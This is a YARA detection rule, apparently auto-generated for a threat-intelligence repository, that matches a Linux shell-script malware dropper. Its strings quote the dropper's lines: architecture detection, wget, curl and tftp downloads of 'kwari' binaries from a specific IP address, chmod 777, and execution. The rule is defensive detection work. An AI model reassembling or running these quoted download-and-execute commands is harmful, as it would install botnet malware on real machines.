rule SCRIPT_Sample_Unique_7c77f80c
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "7c77f80c4cb795f8d19a1c90340ff39012c1617d8b4f7cfe7cb3b8f7a14521c8"
        yarahub_uuid = "32fd2703-62d4-44f9-9893-6c266e3b3c59"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "b899b991709f923501c2037edbff89ba"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "m=$(uname -m 2>/dev/null)" ascii
        $s1 = "wget http://139.99.209.90/bins/kwari.$1 -O k 2>/dev/null \\" ascii
        $s2 = "|| curl -o k http://139.99.209.90/bins/kwari.$1 2>/dev/null \\" ascii
        $s3 = "|| tftp -g -r kwari.$1 -l k 139.99.209.90 2>/dev/null" ascii
        $s4 = "if [ -n \"$a\" ]; then" ascii
        $s5 = "if [ -s k ]; then chmod 777 k; ./k SSH & exit 0; fi" ascii
        $s6 = "kill -0 $! 2>/dev/null && exit 0" ascii
        $s7 = "cd /tmp || cd /dev/shm || cd /var/tmp || cd /" ascii
        $s8 = "aarch64|armv8*|armv7*) a=arm7 ;;" ascii
        $s9 = "for x in x86 arm7 arm arm5 arm6 mips mpsl ppc sh4 m68k spc; do" ascii
        $s10 = "if [ -s k ]; then" ascii
        $s11 = "mips) a=mips ;;" ascii
        $s12 = "armv6*) a=arm6 ;;" ascii
        $s13 = "armv5*|armv4*) a=arm5 ;;" ascii
        $s14 = "ppc*|powerpc*) a=ppc ;;" ascii
        $s15 = "sparc*) a=spc ;;" ascii
        $s16 = "chmod 777 k" ascii
    condition:
        true and filesize < 50MB and 3 of ($s0, $s4, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s14, $s15, $s16) and 1 of ($s1, $s2, $s3)
}
